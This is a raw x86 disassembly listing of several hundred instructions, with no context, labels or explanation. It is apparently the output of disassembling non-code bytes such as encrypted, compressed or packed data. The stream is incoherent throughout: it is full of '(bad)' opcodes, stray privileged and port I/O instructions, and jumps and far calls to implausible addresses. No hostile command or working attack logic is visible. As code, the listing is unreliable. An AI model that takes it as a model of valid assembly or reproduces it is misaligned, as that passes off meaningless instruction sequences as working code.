  41e64e:	or     cl,ah
  41e650:	aaa    
  41e651:	add    eax,0x96baf6cf
  41e656:	push   cs
  41e657:	xor    DWORD PTR [ecx-0x7e],eax
  41e65a:	sahf   
  41e65b:	hlt    
  41e65c:	mov    edx,0x5292f2e
  41e661:	fisttp QWORD PTR [edi]
  41e663:	mov    al,es:0xb409df8
  41e669:	jg     0x41e649
  41e66b:	mov    BYTE PTR [ecx-0x401eb7f4],dl
  41e671:	aad    0x78
  41e673:	nop
  41e674:	and    BYTE PTR [eax],bl
  41e676:	sahf   
  41e677:	test   eax,ecx
  41e679:	nop
  41e67a:	es (bad) 
  41e67c:	xchg   esp,eax
  41e67d:	and    esi,DWORD PTR [ebx+0x6c]
  41e680:	cli    
  41e681:	out    dx,al
  41e682:	pop    esi
  41e683:	sti    
  41e684:	cld    
  41e685:	fiadd  WORD PTR [edx-0xda295e9]
  41e68b:	mov    bl,0xd4
  41e68d:	out    dx,al
  41e68e:	mov    ch,0x4
  41e690:	push   eax
  41e691:	push   ecx
  41e692:	sub    ecx,DWORD PTR [eax+0x1684422c]
  41e698:	xor    eax,0xc1c0edda
  41e69d:	dec    esp
  41e69e:	sbb    esp,DWORD PTR [edx-0x3a968f92]
  41e6a4:	push   ebx
  41e6a5:	jnp    0x41e6ea
  41e6a7:	jns    0x41e64f
  41e6a9:	sbb    cl,bh
  41e6ab:	inc    edi
  41e6ac:	lea    ebp,[ecx+0x3038338a]
  41e6b2:	fistp  QWORD PTR [esi-0x169d1ba7]
  41e6b8:	aas    
  41e6b9:	or     DWORD PTR [eax+0x53e22f7b],ebp
  41e6bf:	div    DWORD PTR [edx]
  41e6c1:	push   ecx
  41e6c2:	mov    bh,0xb6
  41e6c4:	adc    eax,0xfb93f006
  41e6c9:	mov    DWORD PTR [ecx-0x5b],ebp
  41e6cc:	push   ebp
  41e6cd:	(bad)  
  41e6ce:	aam    0x8b
  41e6d0:	cld    
  41e6d1:	mov    dl,0x61
  41e6d3:	cs ja  0x41e6c5
  41e6d6:	aas    
  41e6d7:	add    BYTE PTR [ebx-0x7ca55b31],ah
  41e6dd:	ds inc edx
  41e6df:	sub    al,0xaa
  41e6e1:	shrd   DWORD PTR [edx-0x2d],ebp,cl
  41e6e5:	lds    esi,FWORD PTR [ebp+0x44b80d24]
  41e6eb:	retf   
  41e6ec:	dec    ebx
  41e6ed:	xchg   esp,eax
  41e6ee:	mov    dl,0xcd
  41e6f0:	fucomp st(5)
  41e6f2:	and    dl,BYTE PTR [edx-0x5ec28cf5]
  41e6f8:	adc    DWORD PTR [edi],ebx
  41e6fa:	sbb    BYTE PTR [edx-0x73a51d45],bh
  41e700:	jg     0x41e684
  41e702:	loopne 0x41e73f
  41e704:	aam    0x40
  41e706:	and    eax,0x383d4537
  41e70b:	dec    ebx
  41e70c:	test   eax,0xe47cdbb3
  41e711:	push   esi
  41e712:	jecxz  0x41e776
  41e714:	add    BYTE PTR ds:0x5c33fac9,0xe8
  41e71b:	dec    eax
  41e71c:	push   edx
  41e71d:	adc    bl,BYTE PTR [esi-0x30]
  41e720:	pop    esp
  41e721:	popf   
  41e722:	mov    esp,0x58e9c453
  41e727:	adc    bl,ah
  41e729:	jmp    FWORD PTR [esi+0x18]
  41e72c:	adc    ch,dh
  41e72e:	mov    es,WORD PTR [ebx]
  41e730:	pop    ebx
  41e731:	lahf   
  41e732:	push   ds
  41e733:	adc    bh,BYTE PTR [ecx+0x56570b75]
  41e739:	out    dx,al
  41e73a:	ret    
  41e73b:	mov    al,ds:0x3fa133a
  41e740:	out    dx,al
  41e741:	inc    ecx
  41e742:	xor    ebp,DWORD PTR cs:[edi+ecx*1]
  41e746:	call   DWORD PTR [edi-0x40]
  41e749:	or     al,BYTE PTR [ecx-0x5]
  41e74c:	int    0xd6
  41e74e:	hlt    
  41e74f:	addr16 loop 0x41e6ed
  41e752:	ins    DWORD PTR es:[edi],dx
  41e753:	in     eax,dx
  41e754:	inc    ecx
  41e755:	lds    edx,FWORD PTR [edi]
  41e757:	imul   ebp,DWORD PTR [ebp-0x13dc54a6],0x8f22c6c9
  41e761:	add    BYTE PTR [edi],dh
  41e763:	(bad)  
  41e764:	in     eax,dx
  41e765:	arpl   WORD PTR [ecx],bp
  41e767:	test   al,0xe
  41e769:	mov    esi,0x8f5cf7a4
  41e76e:	push   eax
  41e76f:	jns    0x41e724
  41e771:	xor    DWORD PTR [esi],ecx
  41e773:	xchg   edx,eax
  41e774:	and    DWORD PTR [edi],ecx
  41e776:	add    DWORD PTR [edi-0x61af0c56],edx
  41e77c:	out    0x31,eax
  41e77e:	cmp    BYTE PTR [esi],ah
  41e780:	pop    ss
  41e781:	mov    WORD PTR [edx-0x76],ss
  41e784:	or     BYTE PTR [edx],dl
  41e786:	test   BYTE PTR [edi],ah
  41e788:	mov    ebx,0xff4e71d7
  41e78d:	sbb    DWORD PTR [ebp-0x72447efe],0x5d
  41e794:	push   ebp
  41e795:	fisubr WORD PTR [esp+edx*8]
  41e798:	std    
  41e799:	ret    
  41e79a:	push   eax
  41e79b:	pop    ds
  41e79c:	aam    0x64
  41e79e:	or     eax,0x7e633dda
  41e7a3:	ins    BYTE PTR es:[edi],dx
  41e7a4:	rcr    BYTE PTR [ebx+0x48348a92],0x58
  41e7ab:	mov    esp,0x6b1fe15c
  41e7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7b1:	mov    bl,0xe7
  41e7b3:	dec    DWORD PTR [eax]
  41e7b5:	and    BYTE PTR [ecx-0x505cb895],0x5b
  41e7bc:	sti    
  41e7bd:	fmul   QWORD PTR [ebx+0x47fa9754]
  41e7c3:	or     DWORD PTR [ebx],ecx
  41e7c5:	ret    
  41e7c6:	add    eax,0x728e696f
  41e7cb:	loopne 0x41e7d1
  41e7cd:	je     0x41e75f
  41e7cf:	pop    eax
  41e7d0:	ds retf 0x575e
  41e7d4:	sub    BYTE PTR [ebp-0x1e],bl
  41e7d7:	mov    ebp,0x4f542f8e
  41e7dc:	out    dx,eax
  41e7dd:	loop   0x41e82d
  41e7df:	(bad)  
  41e7e0:	loop   0x41e787
  41e7e2:	(bad)  
  41e7e4:	add    edx,edx
  41e7e6:	loop   0x41e770
  41e7e8:	ss inc edx
  41e7ea:	mov    dh,0xef
  41e7ec:	cmp    bh,BYTE PTR [ecx-0xe3b2c73]
  41e7f2:	xchg   edx,eax
  41e7f3:	push   ebp
  41e7f4:	adc    BYTE PTR ds:0xcab1754e,ah
  41e7fa:	sub    BYTE PTR [eax-0x28b1db77],bl
  41e800:	push   esp
  41e801:	push   0xeb4e438d
  41e806:	(bad)  
  41e808:	add    dh,dh
  41e80a:	push   0xffffffac
  41e80c:	pop    ecx
  41e80d:	push   esp
  41e80e:	ret    
  41e80f:	dec    ebp
  41e810:	jno    0x41e87b
  41e812:	adc    DWORD PTR [edi],edi
  41e814:	push   ebx
  41e815:	popa   
  41e816:	add    esp,esi
  41e818:	arpl   bx,di
  41e81a:	cmp    BYTE PTR [esi],al
  41e81c:	sub    ebp,DWORD PTR [ecx-0x7b]
  41e81f:	ins    BYTE PTR es:[edi],dx
  41e820:	dec    ecx
  41e821:	into   
  41e822:	mov    esp,0x88922cca
  41e827:	cmp    al,0x33
  41e829:	push   ss
  41e82a:	mov    ah,0x82
  41e82c:	fsubr  st,st(7)
  41e82e:	dec    edx
  41e82f:	jo     0x41e8ac
  41e831:	jmp    0x3f3a:0x4685b112
  41e838:	mov    cl,0xdf
  41e83a:	pop    ds
  41e83b:	stos   DWORD PTR es:[edi],eax
  41e83c:	mov    ch,0xb9
  41e83e:	xchg   DWORD PTR [edx],eax
  41e840:	fild   QWORD PTR [ebx+0x248f0e1c]
  41e846:	icebp  
  41e847:	faddp  st(5),st
  41e849:	jb     0x41e7de
  41e84b:	ins    DWORD PTR es:[edi],dx
  41e84c:	das    
  41e84d:	sub    BYTE PTR [edi-0x6821271b],dh
  41e853:	push   0x73dad2fd
  41e858:	jbe    0x41e8b7
  41e85a:	and    BYTE PTR [ebx-0x4],0xe1
  41e85e:	ds sahf 
  41e860:	pop    esp
  41e861:	adc    ch,BYTE PTR [ebp+0x6a5f4f42]
  41e867:	cmp    BYTE PTR [edi],dh
  41e869:	pop    es
  41e86a:	xchg   edx,eax
  41e86b:	or     al,0xc8
  41e86d:	add    bl,BYTE PTR [ebx+0x26eb7e24]
  41e873:	jb     0x41e829
  41e875:	lods   al,BYTE PTR ds:[esi]
  41e876:	dec    esp
  41e877:	xor    al,BYTE PTR [edx]
  41e879:	push   ecx
  41e87a:	xor    eax,0xdd10309d
  41e87f:	into   
  41e880:	iret   
  41e881:	cmp    DWORD PTR [esi],ebp
  41e883:	sub    al,0x0
  41e885:	call   0x4589b59
  41e88a:	jle    0x41e83d
  41e88c:	mov    eax,ds:0x7751000f
  41e891:	aaa    
  41e892:	jl     0x41e8e4
  41e894:	ins    DWORD PTR es:[edi],dx
  41e895:	mov    al,ds:0x8446281f
  41e89a:	cmp    dh,BYTE PTR [edx]
  41e89c:	sbb    al,dl
  41e89e:	imul   esi,DWORD PTR [ebp+ebp*1-0x4ead2321],0x30
  41e8a6:	add    eax,ebx
  41e8a8:	xchg   ebp,eax
  41e8a9:	addr16 out dx,al
  41e8ab:	shl    BYTE PTR [ecx+0x3de3e0aa],0x4b
  41e8b2:	mov    edx,0xece2ada5
  41e8b7:	jae    0x41e855
  41e8b9:	outs   dx,BYTE PTR ds:[esi]
  41e8ba:	cs or  al,0x7
  41e8bd:	sub    eax,0xc99239a1
  41e8c2:	pop    ebp
  41e8c3:	fisub  WORD PTR [edi+0x14]
  41e8c6:	jns    0x41e861
  41e8c8:	xor    BYTE PTR [edx],bh
  41e8ca:	imul   ebp,edx,0x3b5e6622
  41e8d0:	shr    BYTE PTR [ebp-0x68],1
  41e8d3:	push   0x79e0b225
  41e8d8:	js     0x41e91b
  41e8da:	sbb    al,0x41
  41e8dc:	mov    eax,ds:0x47f88983
  41e8e1:	les    ebx,FWORD PTR [esi]
  41e8e3:	push   edx
  41e8e4:	addr16 dec edi
  41e8e6:	push   ss
  41e8e7:	dec    ebp
  41e8e8:	dec    ebx
  41e8e9:	(bad)  
  41e8ea:	jmp    0x427d62f3
  41e8ef:	jo     0x41e8b3
  41e8f1:	ret    
  41e8f2:	leave  
  41e8f3:	sub    ah,dh
  41e8f5:	or     al,0x2c
  41e8f7:	push   ecx
  41e8f8:	mov    eax,DWORD PTR [ebx+0x3a]
  41e8fb:	out    0x3b,eax
  41e8fd:	dec    eax
  41e8fe:	xchg   esp,eax
  41e8ff:	pop    edi
  41e900:	xor    esi,DWORD PTR [ebx+eax*1]
  41e903:	add    cl,0x23
  41e906:	out    0x26,eax
  41e908:	cdq    
  41e909:	push   edx
  41e90a:	sahf   
  41e90b:	and    DWORD PTR [ebx-0xa0320c3],esp
  41e911:	pop    edx
  41e912:	jp     0x41e980
  41e914:	sbb    al,0xbc
  41e916:	nop
  41e917:	push   esi
  41e918:	mov    ebx,0x45babc1d
  41e91d:	cmp    DWORD PTR [edi-0x77605607],edi
  41e923:	mov    esi,ds
  41e925:	xchg   BYTE PTR [ecx-0x7a8668c6],al
  41e92b:	inc    ebx
  41e92c:	fcmovu st,st(3)
  41e92e:	push   ebx
  41e92f:	xlat   BYTE PTR ds:[ebx]
  41e930:	fwait
  41e931:	sar    BYTE PTR [eax+0x3e23c340],0xe2
  41e938:	sub    ebx,DWORD PTR [esi-0x1e]
  41e93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e93c:	sbb    eax,esi
  41e93e:	cmp    ah,BYTE PTR [esi]
  41e940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e941:	jno    0x41e98c
  41e943:	or     BYTE PTR [edi-0x2c8e86ba],dh
  41e949:	shl    esi,1
  41e94b:	rcr    BYTE PTR [edx-0x6dff0df5],cl
  41e951:	inc    esp
  41e952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e953:	inc    edi
  41e954:	arpl   si,bp
  41e956:	pop    eax
  41e957:	in     eax,0x30
  41e959:	ins    BYTE PTR es:[edi],dx
  41e95a:	mov    ?,WORD PTR [esi-0x5c]
  41e95d:	adc    bl,BYTE PTR [ebp-0x70f37ef8]
  41e963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e964:	adc    al,0xb7
  41e966:	pop    eax
  41e967:	or     cl,ch
  41e969:	rcr    DWORD PTR [esi+0x3747a36e],cl
  41e96f:	clc    
  41e970:	enter  0xb335,0xe7
  41e974:	outs   dx,DWORD PTR ds:[esi]
  41e975:	loop   0x41e97c
  41e977:	call   0x8b1c7cd3
  41e97c:	div    edi
  41e97e:	adc    BYTE PTR [edx+0x4],dl
  41e981:	pop    esi
  41e982:	test   al,0x9
  41e984:	gs inc edx
  41e986:	lods   al,BYTE PTR ds:[esi]
  41e987:	sar    DWORD PTR [edx-0x68],cl
  41e98a:	xchg   BYTE PTR [edi],dh
  41e98c:	pop    edi
  41e98d:	sbb    ah,al
  41e98f:	inc    ecx
  41e990:	jns    0x41e9a6
  41e992:	inc    ebx
  41e993:	pusha  
  41e994:	push   ss
  41e995:	repz popf 
  41e997:	(bad)  
  41e998:	xchg   esp,eax
  41e999:	mov    cl,0xa4
  41e99b:	adc    eax,0x510ed57
  41e9a0:	fldcw  WORD PTR [edi-0x1f]
  41e9a3:	xor    eax,0x3de8f3a3
  41e9a8:	push   ecx
  41e9a9:	or     al,0xbf
  41e9ab:	addr16 leave 
  41e9ad:	xor    edi,DWORD PTR [edx+0x4cc9e964]
  41e9b3:	xor    bl,BYTE PTR [ecx]
  41e9b5:	xor    eax,0x927a33a8
  41e9ba:	rcl    BYTE PTR [ebp+0x94fe9c2],1
  41e9c0:	mov    WORD PTR [edx-0x13],es
  41e9c3:	pop    edi
  41e9c4:	jae    0x41e9c9
  41e9c6:	jns    0x41ea20
  41e9c8:	sub    bl,BYTE PTR [ebx+0x7a0e036d]
  41e9ce:	jb     0x41e976
  41e9d0:	jg     0x41ea3f
  41e9d2:	jmp    0x4f6febc1
  41e9d7:	(bad)  [edx]
  41e9d9:	sub    al,0xb5
  41e9db:	call   0xa0b0047f
  41e9e0:	sbb    edx,DWORD PTR [esi-0x23]
  41e9e3:	fnsave [ecx]
  41e9e5:	test   al,0x29
  41e9e7:	iret   
  41e9e8:	inc    ebx
  41e9e9:	cmp    ebx,eax
  41e9eb:	xchg   BYTE PTR [esi+0x27228f22],bl
  41e9f1:	pushf  
  41e9f2:	dec    ebx
  41e9f3:	imul   ebp,ebx,0xc
  41e9f6:	neg    esi
  41e9f8:	gs sbb cl,bh
  41e9fb:	lea    edi,[ebx-0x4a]
  41e9fe:	pusha  
  41e9ff:	in     al,0xa2
  41ea01:	xchg   esi,eax
  41ea02:	retf   
  41ea03:	in     eax,dx
  41ea04:	cwde   
  41ea05:	cdq    
  41ea06:	mov    edi,0x515cb46d
  41ea0b:	or     DWORD PTR [edi-0x42068df9],eax
  41ea11:	nop    DWORD PTR ds:0xbd7b9fe
  41ea18:	mov    al,ds:0xbb1902f6
  41ea1d:	arpl   WORD PTR [edi-0x4a],ax
  41ea20:	les    ebx,FWORD PTR [ecx+0x45]
  41ea23:	(bad)  
  41ea25:	or     eax,0x2c0e3bc1
  41ea2a:	mov    ebp,0xfa36224e
  41ea2f:	mov    eax,0x4f8e8d74
  41ea34:	jmp    0xed99:0xdb49036f
  41ea3b:	xchg   esi,eax
  41ea3c:	jns    0x41ea61
  41ea3e:	xchg   esi,eax
  41ea3f:	mov    ecx,eax
  41ea41:	push   0xfffffff6
  41ea43:	inc    ebp
  41ea44:	sbb    eax,0x77574533
  41ea49:	inc    esi
  41ea4a:	push   ecx
  41ea4b:	push   ebp
  41ea4c:	loope  0x41eac9
  41ea4e:	xchg   ecx,eax
  41ea4f:	repnz in eax,dx
  41ea51:	mov    dl,0xab
  41ea53:	pop    eax
  41ea54:	in     eax,0xf9
  41ea56:	les    esi,FWORD PTR [edi+ebp*8+0x1080e1ad]
  41ea5d:	(bad)  
  41ea5e:	aaa    
  41ea5f:	dec    ebp
  41ea60:	retf   
  41ea61:	scas   al,BYTE PTR es:[edi]
  41ea62:	cwde   
  41ea63:	push   ebp
  41ea64:	xchg   edi,eax
  41ea65:	fistp  WORD PTR [edi-0x4e]
  41ea68:	inc    edx
  41ea69:	div    DWORD PTR [edi-0x6a5a9209]
  41ea6f:	pop    edi
  41ea70:	mov    DWORD PTR [edi-0x7c],esi
  41ea73:	std    
  41ea74:	js     0x41eaa3
  41ea76:	aas    
  41ea77:	mov    eax,ds:0x4b5cf640
  41ea7c:	daa    
  41ea7d:	and    eax,0x8f7dd2f5
  41ea82:	sub    bh,BYTE PTR [edi+0x1f]
  41ea85:	arpl   WORD PTR [ebx],dx
  41ea87:	jns    0x41eae5
  41ea89:	cmp    esi,eax
  41ea8b:	pop    ecx
  41ea8c:	cmc    
  41ea8d:	test   DWORD PTR [esi+ebp*2],0x8ab2dcc1
  41ea94:	pop    ebx
  41ea95:	xchg   ebx,eax
  41ea96:	jne    0x41ea20
  41ea98:	sub    dh,BYTE PTR [edi]
  41ea9a:	repz xchg edi,eax
  41ea9c:	sub    DWORD PTR ds:0x418e41c0,ebx
  41eaa2:	mov    ss,WORD PTR [ebx+0x27]
  41eaa5:	ret    
  41eaa6:	into   
  41eaa7:	ficom  DWORD PTR [edi+ebx*2+0x367ed62f]
  41eaae:	popf   
  41eaaf:	mov    esp,0xbac52530
  41eab4:	jmp    ebp
  41eab6:	mov    bl,dl
  41eab8:	add    ch,BYTE PTR [edi+edx*8+0x16]
  41eabc:	mov    al,0xe7
  41eabe:	add    eax,0x757b0d88
  41eac3:	add    DWORD PTR [ebx+eiz*4+0x4f],eax
  41eac7:	ds mov cl,0xe9
  41eaca:	fdiv   QWORD PTR [ecx-0x428490c8]
  41ead0:	cmc    
  41ead1:	lds    esi,FWORD PTR [edx]
  41ead3:	cld    
  41ead4:	sub    dl,bl
  41ead6:	cdq    
  41ead7:	test   eax,0xeb6411bb
  41eadc:	sub    eax,0xc7566db7
  41eae1:	cmp    al,0x81
  41eae3:	mov    esp,0x34f54a71
  41eae8:	push   0xf9c03e7f
  41eaed:	jge    0x41eab2
  41eaef:	jns    0x41eb18
  41eaf1:	mov    eax,0x16197edd
  41eaf6:	inc    esi
  41eaf7:	out    0x7e,al
  41eaf9:	sbb    BYTE PTR [ecx+0x1e5858f9],cl
  41eaff:	cmp    edx,0x70
  41eb02:	test   BYTE PTR [esi-0x1f5aaf1e],0x4b
  41eb09:	loop   0x41ea9e
  41eb0b:	or     ah,BYTE PTR [eax-0x5a2ccef1]
  41eb11:	std    
  41eb12:	into   
  41eb13:	popf   
  41eb14:	cdq    
  41eb15:	mov    BYTE PTR ss:[edi],cl
  41eb18:	arpl   WORD PTR [edx-0x7d3a9bd8],dx
  41eb1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb1f:	dec    ebp
  41eb20:	dec    eax
  41eb21:	sbb    DWORD PTR [ebx],esi
  41eb23:	jmp    0x23a7d05c
  41eb28:	add    bl,BYTE PTR ds:0x898c0678
  41eb2e:	mov    edx,0x306a85ce
  41eb33:	sahf   
  41eb34:	jmp    esi
  41eb36:	sbb    edx,DWORD PTR ds:0xd3269c3
  41eb3c:	out    dx,eax
  41eb3d:	jl     0x41eb5a
  41eb3f:	add    al,0x47
  41eb41:	out    0x3d,al
  41eb43:	in     al,0x38
  41eb45:	cmp    eax,0x34162eba
  41eb4a:	add    al,BYTE PTR [esi+0x35]
  41eb4d:	into   
  41eb4e:	outs   dx,BYTE PTR ds:[esi]
  41eb4f:	mov    ecx,0x9069b3b
  41eb54:	in     al,dx
  41eb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb56:	push   esi
  41eb57:	addr16 xchg ebp,eax
  41eb59:	inc    esi
  41eb5a:	pop    ebp
  41eb5b:	pushf  
  41eb5c:	dec    esi
  41eb5d:	(bad)  
  41eb5f:	shl    BYTE PTR [edi+0x41bbf1d7],cl
  41eb65:	stc    
  41eb66:	jns    0x41eb06
  41eb68:	push   esp
  41eb69:	cmc    
  41eb6a:	adc    DWORD PTR ds:0x5a570693,0xffffffea
  41eb71:	and    al,0x96
  41eb73:	jne    0x41ebe3
  41eb75:	test   eax,0x6931ba30
  41eb7a:	(bad)  
  41eb7b:	pop    eax
  41eb7c:	psrlq  mm6,QWORD PTR [eax]
  41eb7f:	mul    DWORD PTR [esi+0x2a]
  41eb82:	fbstp  TBYTE PTR [edx-0x6fbb07ea]
  41eb88:	es push esp
  41eb8a:	(bad)  
  41eb8b:	push   es
  41eb8c:	fwait
  41eb8d:	xchg   DWORD PTR [ecx-0x3a5bbd33],edx
  41eb93:	shl    ch,1
  41eb95:	out    0xe7,eax
  41eb97:	addr16 push esp
  41eb99:	shl    BYTE PTR [edi+0x2c3d13be],cl
  41eb9f:	aaa    
  41eba0:	dec    esi
  41eba1:	into   
  41eba2:	push   ds
  41eba3:	(bad)  
  41eba4:	in     eax,dx
  41eba5:	mov    edx,DWORD PTR [ebx+edi*2-0x79a9476f]
  41ebac:	jno    0x41ec01
  41ebae:	stc    
  41ebaf:	push   ds
  41ebb0:	push   0x2d67d07
  41ebb5:	jae    0x41ec24
  41ebb7:	bound  esp,QWORD PTR [ecx-0x74958d74]
  41ebbd:	pop    eax
  41ebbe:	jno    0x41eb7c
  41ebc0:	xchg   edx,eax
  41ebc1:	fild   DWORD PTR [ecx+0x2e4d4d06]
  41ebc7:	add    DWORD PTR [edi],edi
  41ebc9:	loop   0x41eb73
  41ebcb:	jle    0x41ebc8
  41ebcd:	popa   
  41ebce:	bound  ebx,QWORD PTR [esi]
  41ebd0:	shl    BYTE PTR [eax+ecx*8+0x22b22187],1
  41ebd7:	es hlt 
  41ebd9:	inc    ebp
  41ebda:	xchg   esi,eax
  41ebdb:	mov    edi,0x17c91c5b
  41ebe0:	aaa    
  41ebe1:	cmp    al,0x3e
  41ebe3:	ret    
  41ebe4:	cmp    BYTE PTR [edi-0x18e360e],ah
  41ebea:	jae    0x41ec02
  41ebec:	popa   
  41ebed:	mov    ebp,0xfbae7cf4
  41ebf2:	inc    ebp
  41ebf3:	ja     0x41ec57
  41ebf5:	scas   eax,DWORD PTR es:[edi]
  41ebf6:	add    ebx,DWORD PTR [edi-0x19fd791c]
  41ebfc:	pop    edi
  41ebfd:	sbb    eax,0x27419b31
  41ec02:	mov    bl,0xcb
  41ec04:	inc    edx
  41ec05:	repz mov ebx,?
  41ec08:	and    eax,0x71e97b50
  41ec0d:	pop    esp
  41ec0e:	xchg   edi,eax
  41ec0f:	xor    ah,BYTE PTR [edi+0x278b389f]
  41ec15:	lea    eax,[edx]
  41ec17:	icebp  
  41ec18:	sub    ebx,DWORD PTR [esi+0x66]
  41ec1b:	push   eax
  41ec1c:	outs   dx,BYTE PTR ds:[esi]
  41ec1d:	imul   ecx,DWORD PTR [eax+0x45],0x37d815e9
  41ec24:	je     0x41ebe8
  41ec26:	xchg   edi,eax
  41ec27:	xor    al,al
  41ec29:	sti    
  41ec2a:	sbb    BYTE PTR [ebx],0x8e
  41ec2d:	nop
  41ec2e:	ret    0x5d20
  41ec31:	mov    ds:0x32b89493,eax
  41ec36:	jnp    0x41ebc1
  41ec38:	xchg   edx,eax
  41ec39:	push   esi
  41ec3a:	pop    ecx
  41ec3b:	shl    DWORD PTR ds:0x928e80eb,cl
  41ec41:	cmp    DWORD PTR [ebx-0x5f],esp
  41ec44:	or     edx,ecx
  41ec46:	mov    bh,0x7a
  41ec48:	aaa    
  41ec49:	bsf    esp,DWORD PTR [ebx-0x56]
  41ec4d:	pop    ecx
  41ec4e:	jno    0x41ebf3
  41ec50:	cs pusha 
  41ec52:	mov    bh,0x9e
  41ec54:	mov    edi,0x872bf60f
  41ec59:	scas   eax,DWORD PTR es:[edi]
  41ec5a:	inc    ebp
  41ec5b:	cmp    BYTE PTR [edi],ah
  41ec5d:	fiadd  DWORD PTR [eax+0x2a6169dc]
  41ec63:	das    
  41ec64:	(bad)  
  41ec65:	lahf   
  41ec66:	clc    
  41ec67:	or     al,0xb9
  41ec69:	leave  
  41ec6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec6b:	in     al,0x6e
  41ec6d:	fcmovnu st,st(0)
  41ec6f:	mov    ebx,0x802cdd10
  41ec74:	pop    ecx
  41ec75:	fdiv   DWORD PTR [esp+eax*4-0x4d393910]
  41ec7c:	stc    
  41ec7d:	scas   al,BYTE PTR es:[edi]
  41ec7e:	(bad)  
  41ec7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec80:	enter  0xb335,0x51
  41ec84:	loopne 0x41ecc7
  41ec86:	sub    eax,0x3ef022c7
  41ec8b:	push   ss
  41ec8c:	rol    BYTE PTR [edi+0x3b],0x4d
  41ec90:	das    
  41ec91:	cmp    DWORD PTR [ebp-0x46f18faa],edx
  41ec97:	inc    edi
  41ec98:	pop    edi
  41ec99:	adc    ecx,DWORD PTR [edi+ebx*2]
  41ec9c:	out    0x59,eax
  41ec9e:	les    edi,FWORD PTR [edx+0x7a919460]
  41eca4:	xchg   esp,eax
  41eca5:	inc    edi
  41eca6:	fstp   TBYTE PTR [edx+0x549e73af]
  41ecac:	or     cl,BYTE PTR [edi-0x5e]
  41ecaf:	add    ecx,ebp
  41ecb1:	int    0xbf
  41ecb3:	push   ss
  41ecb4:	call   0x7715:0x81de0f50
  41ecbb:	aad    0xc4
  41ecbd:	add    bl,dl
  41ecbf:	cdq    
  41ecc0:	cmc    
  41ecc1:	in     al,dx
  41ecc2:	xchg   esi,eax
  41ecc3:	in     al,0xb4
  41ecc5:	cli    
  41ecc6:	push   ebx
  41ecc7:	dec    esp
  41ecc8:	aad    0x2
  41ecca:	cmp    eax,0x57711e17
  41eccf:	push   ebx
  41ecd0:	sub    dh,BYTE PTR [ebx]
  41ecd2:	add    dl,cl
  41ecd4:	push   ebp
  41ecd5:	push   0xee54c487
  41ecda:	ins    BYTE PTR es:[edi],dx
  41ecdb:	es xor eax,0x14b18fd3
  41ece1:	mov    al,0xf7
  41ece3:	lods   al,BYTE PTR ds:[esi]
  41ece4:	mov    ebp,0x8ef928af
  41ece9:	or     al,0xc8
  41eceb:	dec    esp
  41ecec:	in     eax,dx
  41eced:	inc    esp
  41ecee:	sub    bh,dl
  41ecf0:	fdivrp st(1),st
  41ecf2:	mov    ebp,0x2c89f33d
  41ecf7:	dec    esp
  41ecf8:	aam    0x58
  41ecfa:	inc    eax
  41ecfb:	pop    eax
  41ecfc:	and    ah,BYTE PTR [ebx]
  41ecfe:	push   0x47
  41ed00:	push   eax
  41ed01:	xchg   edx,eax
  41ed02:	sbb    eax,0xd47968de
  41ed07:	lahf   
  41ed08:	not    BYTE PTR [esi]
  41ed0a:	xchg   esp,eax
  41ed0b:	sbb    eax,0x3fcb1948
  41ed10:	mov    al,0x62
  41ed12:	scas   al,BYTE PTR es:[edi]
  41ed13:	lods   eax,DWORD PTR ds:[esi]
  41ed14:	outs   dx,DWORD PTR ds:[esi]
  41ed15:	xor    eax,0x61231a92
  41ed1a:	jmp    0x41ecef
  41ed1c:	xchg   esi,eax
  41ed1d:	mov    ds:0xaf342786,al
  41ed22:	jg     0x41eda1
  41ed24:	cmp    esi,edi
  41ed26:	aas    
  41ed27:	inc    ecx
  41ed28:	xchg   ebx,eax
  41ed29:	xchg   ebx,eax
  41ed2a:	inc    edx
  41ed2b:	mov    ah,0x25
  41ed2d:	test   al,0xaf
  41ed2f:	jmp    DWORD PTR [ecx-0x3b]
  41ed32:	add    al,0x9d
  41ed34:	push   eax
  41ed35:	cmp    al,BYTE PTR ds:0x3cea182a
  41ed3b:	inc    edi
  41ed3c:	mov    bl,BYTE PTR [eax-0x79]
  41ed3f:	imul   ebx,DWORD PTR [edi+0x1f6b8f10],0x74
  41ed46:	push   esi
  41ed47:	cmp    DWORD PTR [ebx+0x63e14644],esi
  41ed4d:	xor    al,ch
  41ed4f:	push   ds
  41ed50:	sar    DWORD PTR [edi+eax*4+0x1b],1
  41ed54:	inc    eax
  41ed55:	data16 fmul QWORD PTR [ebx+0x4c0088ee]
  41ed5c:	push   ebp
  41ed5d:	lahf   
  41ed5e:	aaa    
  41ed5f:	std    
  41ed60:	outs   dx,DWORD PTR ds:[esi]
  41ed61:	mov    edi,0x7e7482ff
  41ed66:	ds call 0x8ec6:0xddacf204
  41ed6e:	sub    eax,0x27e77adf
  41ed73:	cdq    
  41ed74:	stos   BYTE PTR es:[edi],al
  41ed75:	ret    0xb470
  41ed78:	jns    0x41ed81
  41ed7a:	bound  eax,QWORD PTR [eax+0x45063bf4]
  41ed80:	mov    ebx,0xf93b7939
  41ed85:	mov    ch,0x8b
  41ed87:	jge    0x41edc0
  41ed89:	adc    al,0xbf
  41ed8b:	inc    edi
  41ed8c:	out    0x9e,eax
  41ed8e:	les    edx,FWORD PTR [edi+ebx*2+0x4a52ac8b]
  41ed95:	add    eax,0x4d80e533
  41ed9a:	dec    ecx
  41ed9b:	out    dx,eax
  41ed9c:	fstp   QWORD PTR [ecx+esi*4]
  41ed9f:	push   esi
  41eda0:	cwde   
  41eda1:	add    al,0x43
  41eda3:	xor    DWORD PTR [esi],eax
  41eda5:	mov    ch,0x5c
  41eda7:	xchg   edx,eax
  41eda8:	cmc    
  41eda9:	dec    ebx
  41edaa:	cs sti 
  41edac:	push   eax
  41edad:	cdq    
  41edae:	mov    cl,bh
  41edb0:	sti    
  41edb1:	in     eax,dx
  41edb2:	cld    
  41edb3:	out    dx,eax
  41edb4:	lea    ebp,[esi]
  41edb6:	imul   DWORD PTR [ebx-0x36c8d9c2]
